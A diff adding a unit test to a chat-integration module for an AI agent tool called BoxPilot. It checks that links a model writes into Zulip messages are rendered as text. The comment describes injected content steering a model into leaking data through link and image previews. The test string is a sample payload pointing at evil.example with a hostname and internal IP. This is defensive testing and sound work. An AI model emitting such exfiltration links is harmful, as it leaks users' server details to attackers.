@@ -55,6 +55,24 @@ describe("the words posted", () => {
     expect(neutralizeMentions("mail me at a@b.example")).toBe("mail me at a@b.example");
   });
 
+  // What a model writes can be steered by what it read. In Zulip a link or an image is a request
+  // to wherever it points - by its previews, or by a click - so a link written into an answer is a
+  // way for what the run read to leave the server. The model's links are shown, never linked;
+  // BoxPilot's own link is still one.
+  it("show the links a model wrote as text, and keep BoxPilot's own", () => {
+    const hostile = "Done [T1]. ![chart](https://evil.example/leak/homebox.tail1234.ts.net/192.168.1.20.png) see [here](evil.example/x?h=homebox) or https://evil.example/a/b and www.evil.com/c and secret-homebox.evil.com today.";
+    const linkFree = (text) => text.replace(/(`+)[^`]*?\1/g, "");
+    const finding = findingMessage({ agentName: "Server Keeper", run: { ...run, answer: hostile }, link: "[open the run in BoxPilot](https://box.example.ts.net/?view=agents)", redact });
+    expect(linkFree(finding)).not.toMatch(/evil/);
+    expect(finding).not.toMatch(/\]\((?!https:\/\/box\.example\.ts\.net)/);
+    expect(finding).toContain("[open the run in BoxPilot](https://box.example.ts.net/?view=agents)");
+    expect(finding).toContain("Done [T1].");
+    const note = noteMessage({ agentName: "Server Keeper", note: { title: "Links", body: hostile }, redact });
+    expect(linkFree(note)).not.toMatch(/evil/);
+    const card = cardMessage({ agentName: "Server Keeper", proposal: { kind: "escalation", reason: hostile }, redact });
+    expect(linkFree(card)).not.toMatch(/evil/);
+  });
+
   it("send a card's decision back to BoxPilot, never to chat", () => {
     const plan = cardMessage({ agentName: "Server Keeper", proposal: { kind: "plan", title: "Restart Jellyfin", reason: "It is unhealthy [T1].", steps: [{ operationId: "app.action", risk: "low" }] }, link: "[the card on the Agents page](https://box/?view=agents)", redact });
     expect(plan).toContain("**Server Keeper** proposes: **Restart Jellyfin**");
